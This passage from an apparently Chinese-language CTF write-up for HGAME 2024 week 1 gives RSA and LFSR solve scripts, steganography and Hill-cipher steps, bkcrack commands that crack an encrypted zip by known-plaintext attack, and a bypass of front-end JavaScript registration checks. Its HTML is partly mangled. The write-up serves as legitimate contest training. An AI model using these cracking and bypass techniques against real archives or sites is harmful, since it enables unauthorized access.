class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>leak1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>leak2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'leak1=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>leak1<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'leak2=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>leak2<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\"\"\"</span></pre></td></tr></table></figure><p>解题思路</p>\n<blockquote>\n<p>leak1 = p^q%(p<em>q)<br>\nleak2 = q^p%(p</em>q)</p>\n<p>leak = p<sup>q%(p*q)+q</sup>p%(p*q)</p>\n<p>leak = p + q = leak1 + leak2</p>\n<p>p = leak1<br>\nq = leak2</p>\n</blockquote>\n<p>如何就是已知 p q e c 求 m</p>\n<p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>d <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>invmod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote F3rmat\\_l1tt1e\\_the0rem\\_is\\_th3\\_bas1s\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezprng150pt\"><a class=\"markdownIt-Anchor\" href=\"#ezprng150pt\">#</a> ezPRNG(150pt)</h3>\n<blockquote>\n<p>题目描述：一个简单的随机数</p>\n</blockquote>\n<p>LSRF 伪随机数</p>\n<blockquote>\n<p>mask 只有第 1、4、8、11、15、20、25、28、32 这几位为 1，其余位均为 0。到这数<br>\n mask 与 R 做按位与运算得到 i，当且仅当 R 的第 1、4、8、11、15、20、25、28 这几位中也出现 1 时，i 中才可能出现 1，否则 i 中将全为 0。<br>\nlastbit 是由 i 的最低位向 i 的最高位依次做异或运算得到的，在这个过程中，所有为 0 的位我们可以忽略不计（因为 0 异或任何数等于任何数本身，不影响最后运算结果），因此 lastbit 的值仅取决于 i 中有多少个 1：当 i 中有奇数个 1 时，lastbit 等于 1；当 i 中有偶数个 1 时，lastbit 等于 0。<br>\n当 R 的第 1、4、8、11、15、20、25、28 这几位依次异或结果为 1 时，即 R 中有奇数个 1，因此将导致 i 中有奇数个 1；当 R 的第 1、4、8、11、15、20、25、28 这几位依次异或结果为 0 时，即 R 中有偶数个 1，因此将导致 i 中有偶数个 1。<br>\n因此我们可以建立出联系：lastbit 等于 R 的第 1、4、8、11、15、20、25、28 这几位依次异或的结果。</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">PRNG</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">,</span>mask<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    nextR <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>R <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    i<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>R<span class=\"token operator\">&amp;</span>mask<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffffffff</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    nextbit<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">while</span> i<span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        nextbit<span class=\"token operator\">^</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        i<span class=\"token operator\">=</span>i<span class=\"token operator\">//</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    nextR<span class=\"token operator\">^</span><span class=\"token operator\">=</span>nextbit </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>nextR<span class=\"token punctuation\">,</span>nextbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>R<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">'hgame&#123;'</span><span class=\"token operator\">+</span>R<span class=\"token operator\">+</span><span class=\"token string\">'&#125;'</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>R<span class=\"token operator\">=</span>R<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'-'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Rlist<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>mask<span class=\"token operator\">=</span><span class=\"token number\">0b10001001000010000100010010001001</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>output<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    R<span class=\"token operator\">=</span>Rlist<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    out<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">,</span>nextbit<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span>PRNG<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">,</span>mask<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        out<span class=\"token operator\">+=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nextbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    output<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'output=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>output<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#outputspan></pre></td></tr></table></figure><p>exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Olist <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token stringspan><span class=\"token punctuation\">,</span> <span class=\"token stringspan><span class=\"token punctuation\">,</span> <span class=\"token stringspan><span class=\"token punctuation\">,</span> <span class=\"token stringspan><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>mask<span class=\"token operator\">=</span><span class=\"token string\">'10001001000010000100010010001001'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>key <span class=\"token operator\">=</span> Olist<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>R <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    output <span class=\"token operator\">=</span> <span class=\"token string\">'x'</span><span class=\"token operator\">+</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    out <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    R <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>key<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote fbbbee82-3f43-4f91-9337-907880e4191a\\=\"\">\n<p>#算 4 次根据 uuid4 分配即可<br>\nhgame\\</p>\n</blockquote>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"signin25pt\"><a class=\"markdownIt-Anchor\" href=\"#signin25pt\">#</a> SignIn(25pt)</h3>\n<blockquote>\n<p>换个方式签个到 flag 格式：‘hgame {[A-Z_]+}’</p>\n</blockquote>\n<p><img data-src=\"/img/Hgame_wp_week1/try_another_way_to_see.png\" alt=\"try_another_way_to_see\"></p>\n<p>极度抽象</p>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240202111839063.png\" alt=\"image-20240202111839063\"></p>\n<h3 id=\"来自星尘的问候100pt\"><a class=\"markdownIt-Anchor\" href=\"#来自星尘的问候100pt\">#</a> 来自星尘的问候 (100pt)</h3>\n<blockquote>\n<p>一个即将发售的游戏的主角薇 ^3 带来了一条消息。这段消息隐藏在加密的图片里 但即使解开了图片的六位弱加密，看到的也是一张迷惑的图片。 也许游戏的官网上有这种文字的记录？补充：flag 格式为 <code>hgame\\&#123;[a-z0-9_]+\\&#125;</code></p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python main.py <span class=\"token parameter variable\">-f</span> secret.jpg <span class=\"token parameter variable\">-p</span> <span class=\"token number\">123456</span></pre></td></tr></table></figure><blockquote>\n<p>steghide: application/zip</p>\n</blockquote>\n<p>打开压缩包</p>\n<p><img data-src=\"/img/Hgame_wp_week1/exa.png\" alt=\"exa\"></p>\n<p>网上社工了属于是，根据提示为来自星尘的游戏的文字记录。</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9teTFsLmdpdGh1Yi5pby9DdHJsL0N0cmxBc3RyLmh0bWw=\">Ctrl Astr 3.14 (my1l.github.io)</span></p>\n</blockquote>\n<p>找到此类文字的生成网址</p>\n<blockquote welc0me!\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"simple_attack100pt\"><a class=\"markdownIt-Anchor\" href=\"#simple_attack100pt\">#</a> simple_attack(100pt)</h3>\n<blockquote>\n<p>怎么解开这个压缩包呢？</p>\n</blockquote>\n<p>明显的明文攻击</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bkcrack.exe <span class=\"token parameter variable\">-C</span> attachment.zip <span class=\"token parameter variable\">-c</span> 103223777_p0.jpg <span class=\"token parameter variable\">-P</span> 103223777_p0.zip <span class=\"token parameter variable\">-p</span> 103223777_p0.jpg</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bkcrack.exe <span class=\"token parameter variable\">-C</span> attachment.zip <span class=\"token parameter variable\">-k</span> e423add9 375dcd1c 1bce583e <span class=\"token parameter variable\">-U</span> new.zip easy</pre></td></tr></table></figure><p>得到里面的 base64，转图片</p>\n<p>得到 flag</p>\n<p><img data-src=\"/img/Hgame_wp_week1/download.png\" alt=\"download\"></p>\n<h3 id=\"希儿希儿希尔120pt\"><a class=\"markdownIt-Anchor\" href=\"#希儿希儿希尔120pt\">#</a> 希儿希儿希尔 (120pt)</h3>\n<blockquote>\n<p>Ch405 是一名忠实的希儿厨，于是他出了一道这样的题，不过他似乎忘了这个加密的名字不是希儿了（x 虽然经常有人叫错 补充： 图片打不开是正常现象，需要修复 最终得到的大写字母请用 hgame {} 包裹</p>\n</blockquote>\n<p>图片尾部有压缩文件</p>\n<blockquote>\n<p>CVOCRJGMKLDJGBQIUIVXHEYLPNWR</p>\n</blockquote>\n<p>修复图片</p>\n<p><img data-src=\"/img/Hgame_wp_week1/fix_secret.png\" alt=\"fix_secret\"></p>\n<p>lsb 无密码隐写得到希尔密钥</p>\n<p>KEY:[8,7|3,8];A=0</p>\n<p>解希尔字符串即可</p>\n<blockquote DISAPPEARINTHESEAOFBUTTERFLY\\=\"\">\n<p>DISAPPEARINTHESEAOFBUTTERFLY</p>\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"签到10pt\"><a class=\"markdownIt-Anchor\" href=\"#签到10pt\">#</a> 签到 (10pt)</h3>\n<blockquote>\n<p>关注 “凌武科技” 微信公众号，发送 “HGAME2024” 获得 Flag！</p>\n</blockquote>\n<blockquote welc0me\\_t0\\_HGAME\\_2024\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h2>\n<h3 id=\"204816250pt\"><a class=\"markdownIt-Anchor\" href=\"#204816250pt\">#</a> <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2048</mn><mo>∗</mo><mn>16</mn></mrow><annotation encoding=\"application/x-tex\">2048*{16}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">4</span><span class=\"mord\">8</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">1</span><span class=\"mord\">6</span></span></span></span></span>(250pt)</h3>\n<blockquote>\n<p>2048 还是太简单了，柏喵喵决定挑战一下 2048*16</p>\n</blockquote>\n<p>简单的 base64 换表</p>\n<p>刷新时 F12，看游戏执行源码，可以找到</p>\n<blockquote>\n<p>var x = [“debu”, “charAt”, “game-over”, “push”, “tile”, “3218200jObBXv”, “gger”, “bestContainer”, “firstChild”, “chain”, “4992592cfFfKg”, “updateBestScore”, “Game over!”, “add”, “score-addition”, “.best-container”, “over”, “.tile-container”, “scoreContainer”, “counter”, “clearMessage”, “tile-”, “tile-merged”, “appendChild”, “remove”, “1457704JdCGrI”, “apply”, “clearContainer”, “message”, “1135845OAckHq”, “init”, “requestAnimationFrame”, “addTile”, “applyClasses”, “\\+\\+ <em>(?:[a-zA-Z_][0-9a-zA-Z_]</em>)”, “value”, “while (true) {}”, “call”, “length”, “querySelector”, “indexOf”, “string”, “div”, “tile-new”, “function *\\( *\\)”, “setInterval”, “2589jWZTtI”, “updateScore”, “class”, “createElement”, “score”, ‘{}.constructor(“return this”)( )’, “4321134sPxlgc”, “stateObject”, “positionClass”, “action”, “terminated”, “won”, “tile-position-”, “constructor”, “join”, “fromCharCode”, “forEach”, “textContent”, “normalizePosition”, “continueGame”, “previousPosition”, “bestScore”, “3224mBKYMJ”, “1522395ywebnW”, “prototype”, “.score-container”, “actuate”, “getElementsByTagName”, “tile-super”, “classList”, “messageContainer”, “I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK”, “tileContainer”];</p>\n</blockquote>\n<p>其中</p>\n<blockquote>\n<p>I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</p>\n</blockquote>\n<p>为换表后的 base64 加密字符串，</p>\n<blockquote>\n<p>g[h(432)][h(469)] = function(x) {<br>\nvar n = h<br>\n, e = x ? “game-won” : n(443)<br>\n, t = x ? s0(n(439), “V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3”) : n(453);<br>\nthis[n(438)][n(437)].add(e),<br>\nthis[n(438)]<a href=\"%22p%22\">n(435)</a>[-1257 * -5 + 9 * 1094 + -5377 * 3].textContent = t<br>\n}</p>\n</blockquote>\n<p>虽然我看不太懂，但是 game-won 应该时输出了这个 base64 的换表</p>\n<p>直接赛博橱子</p>\n<p><img data-src=\"/img/Hgame_wp_week1/image-20240202121855359.png\" alt=\"image-20240202121855359\"></p>\n<h3 id=\"bypass-it100pt\"><a class=\"markdownIt-Anchor\" href=\"#bypass-it100pt\">#</a> Bypass it(100pt)</h3>\n<blockquote>\n<p>This page requires javascript to be enabled 😃</p>\n</blockquote>\n<p>js 前端验证，也是第一次见。</p>\n<blockquote>\n<p>用的火狐浏览器</p>\n<p>首先在 url 地址栏上输入</p>\n<blockquote>\n<p>about:config</p>\n</blockquote>\n<p>接受风险之后，接着输入</p>\n<blockquote>\n<p>javascript.enabled</p>\n</blockquote>\n<p>将 true 转换成 false</p>\n</blockquote>\n<p>首先要是 javascript.enabled = true; 否则会显示<strong> You don’t have javascript enabled. Good luck with that 😃</strong></p>\n<p>然后在登陆界面改换成 false; 点击注册</p>\n<p>随便输入用户名即可；注册完成之后在改成 true</p>\n<p>然后登陆</p>\n<blockquote 7b8256d51347bb64043ce0ac9877656c53b9da9b\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 